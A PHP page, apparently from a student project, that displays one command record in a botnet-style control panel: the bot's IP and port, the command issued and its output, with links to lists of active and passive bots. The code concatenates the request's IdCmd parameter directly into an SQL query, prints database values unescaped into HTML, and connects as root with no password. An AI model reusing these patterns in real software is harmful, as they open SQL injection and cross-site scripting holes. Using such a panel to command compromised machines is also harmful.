
<?php
$db = new mysqli('localhost', 'root', '', 'pbl4_v2');
if (mysqli_connect_errno()) exit;


if (isset($_REQUEST['IdCmd'])) {
    $id = $_REQUEST['IdCmd'];
    $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
    if (mysqli_connect_errno()) exit;
    $sql = "Select cmd.IdCmd, cmd.Cmd,cmd.CmdResult,cmd.Time, bot.Ip, bot.Port from cmd,bot where IdCmd = " . $id." and bot.Id = cmd.IdBot";
    $rs = mysqli_query($db, $sql);

}

    $header_display = "CMD Detail ";


while ($row = mysqli_fetch_array($rs)) {
    $IdCmd = $row["IdCmd"];
    $Ip = $row["Ip"];
    $Port = $row["Port"];
    $Cmd = $row["Cmd"];
    $CmdResult = $row["CmdResult"];
    $Time = $row["Time"];
}

echo '<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <!-- <link rel="stylesheet" type="text/css" href="../css/copy.css" /> -->
    <!-- <link rel="stylesheet" type="text/css" href="../css/openBot.css" /> -->
    <script src="https://kit.fontawesome.com/yourcode.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
    <title>Open Bot</title>
    <style>
      * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
      }
      body {
        /* background-image: url("../img/botactive.png"); */
        background: url("https://geekprank.com/hacker/green-back.jpg") no-repeat
          center center #000;
        color: #0f0;
        text-shadow: 0px 0px 10px #0f0;
        line-height: 21px;
        font-size: 15px;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        max-width: 100%;
        max-height: 100%;
        overflow: hidden;
      }

      .inputCommand {
        border: 4px solid rgb(75, 194, 75);
        background: black;
        border-radius: 5px;
        justify-content: center;
      }

      /* Header */
      .header {
        width: 100%;
        height: 30px;
        background-color: #00ff00;
        display: flex;
        flex-direction: row;
        justify-content: space-between;
        /* margin-bottom: 50px; */
      }
      .ul_header {
        list-style: none;
      }
      .li_header {
        display: inline-block;
      }
      .ul_header,
      .li_header {
        margin: 0;
        padding: 0;
      }
      .label_header {
        color: black;
        font-weight: 600;
        padding-left: 10px;
        padding-top: 3px;
        font-size: 20px;
      }

      .li_header_icon {
        padding: 5px 8px;
      }

      a {
        text-decoration: none;
      }

      .container {
        display: flex;
        width: 100vw;
        height: 100vh;
        padding: 30px;
        column-gap: 40px;
      }
      .inputCommand {
        width: 80%;
      }
      .navigate {
        margin-left: 30px;
        display: flex;
        flex-wrap: wrap;
        align-items: center;
        /* justify-content: center; */
        width: 15%;
        height: min-content;
        column-gap: 20px;
        row-gap: 20px !important;
        background: transparent;
        padding: 20px;
      }

      .navigate_btn {
        min-width: 140px;
        height: 120px;
        padding: 10px;
        display: flex;
        justify-content: center;
        align-items: center;
        cursor: pointer;
        flex-direction: column;
        /* background: yellow;
        border: 1px solid red; */
      }
      .navigate_btn:hover {
        opacity: 0.6;
        border: 1px dotted #00ff00;
      }
      .navigate_btn-name {
        font-size: 20px;
        font-family: Arial, Helvetica, sans-serif;
        font-weight: bold;
        color: #00ff00;
        text-shadow: -1px 0px 0px #000, 1px 0px 0px #000, 0px 1px 0px #000,
          0px -1px 0px #000;
        text-align: center;
      }
      .navigate_btn-icon {
        color: #00ff00;
        margin-bottom: 4px;
        text-shadow: -1px 0px 0px #000, 1px 0px 0px #000, 0px 1px 0px #000,
          0px -1px 0px #000;
      }
      .navigate_btn:hover .navigate_btn-name,
      .navigate_btn:hover .navigate_btn-icon {
        transform: all 0.5s ease;
        color: #62fa62;
      }
      .content {
        display: flex;
        flex-direction: column;
        align-items: center;
        /* justify-content: center; */
        width: 100%;
        min-height: 90%;
        padding: 30px;
      }
      .content_table {
        width: 100%;
        text-align: center;
        border: 1px solid #00ff00;
      }
      .content_table-thead {
        background: #62fa62;
        color: black;
        text-transform: uppercase;
      }
      .content_table-tr {
        font-weight: bold;
        border: 1px solid #00ff00;
      }
      .content_table-td {
        font-weight: bold;
        border: 1px solid #00ff00;
        max-width: 300px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
      }
      .content_table-th {
        padding: 4px 0px;
      }
      .link_detail {
        color: #00ff00;
        text-decoration: underline;
      }
       .content_element {
            width: 100%;
            margin-bottom: 12px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            /* align-items: center; */
        }

        .content_element-label {
            font-size: 16px;
            min-width: 120px;
            margin-bottom: 8px;
            margin-left: 4px;
        }

        .content_element-input {
            width: 100%;
            padding: 4px 6px;
            background: transparent;
            color: #00ff00;
            border: 1px solid #00ff00;
            outline: none;
            border-radius: 4px;
        }
    </style>
  </head>

  <body>
    <div class="container">
      <div class="inputCommand">
        <div class="header">
          <ul class="ul_header">
            <li class="li_header label_header">
              <label for="">' . $header_display . '</label>
            </li>
          </ul>
          <ul class="ul_header">
            <li class="li_header li_header_icon">
              <i
                class="fa-solid fa-minus"
                style="color: black; text-shadow: none"
              ></i>
            </li>
            <li class="li_header li_header_icon">
              <i
                class="fa-regular fa-square"
                style="color: black; text-shadow: none"
              ></i>
            </li>
            <li class="li_header li_header_icon">
              <i
                class="fa-solid fa-x"
                style="color: black; text-shadow: none"
              ></i>
            </li>
          </ul>
        </div>
        <div class="content">
          <div class="content_element">
            <label class="content_element-label" for="ip">Id Cmd</label>
            <input
              class="content_element-input"
                value="'.$IdCmd. '"
              readonly
            />
          </div>
          <div class="content_element">
            <label class="content_element-label" for="ip">Ip : Port</label>
            <input
              class="content_element-input"
                value="' . $Ip . ' : ' . $Port . '"
              readonly
            />
          </div>

          <div class="content_element">
            <label class="content_element-label" for="ip">Time</label>
            <input
              class="content_element-input"
                value="' . $Time . '"
              readonly
            />
          </div>
          <div class="content_element">
            <label class="content_element-label" for="ip">Cmd</label>
             <textarea
              class="content_element-input"
             readonly
                rows="2"
            >' . $Cmd . '</textarea>
          </div>
          <div class="content_element">
            <label class="content_element-label" for="ip">Result</label>
            <textarea
              class="content_element-input"
               readonly
                rows="8"
            >' . $CmdResult . '</textarea>
          </div>
        </div>
      </div>
      <div class="navigate">
        <a href="listBot.php" class="navigate_btn">
          <i
            class="fa-solid fa-laptop fa-5x navigate_btn-icon"
            style="text-shadow: none"
          ></i>
          <p class="navigate_btn-name">All bot</p>
        </a>
        <a href="listBot.php?status=Active" class="navigate_btn">
          <i
            class="fa-solid fa-laptop fa-5x navigate_btn-icon"
            style="text-shadow: none"
          ></i>
          <p class="navigate_btn-name">Bot Active</p>
        </a>
        <a href="listBot.php?status=Passive" class="navigate_btn">
          <i
            class="fa-solid fa-laptop fa-5x navigate_btn-icon"
            style="text-shadow: none"
          ></i>
          <p class="navigate_btn-name">Bot Passive</p>
        </a>
      </div>
    </div>
  </body>
</html>
';
?>
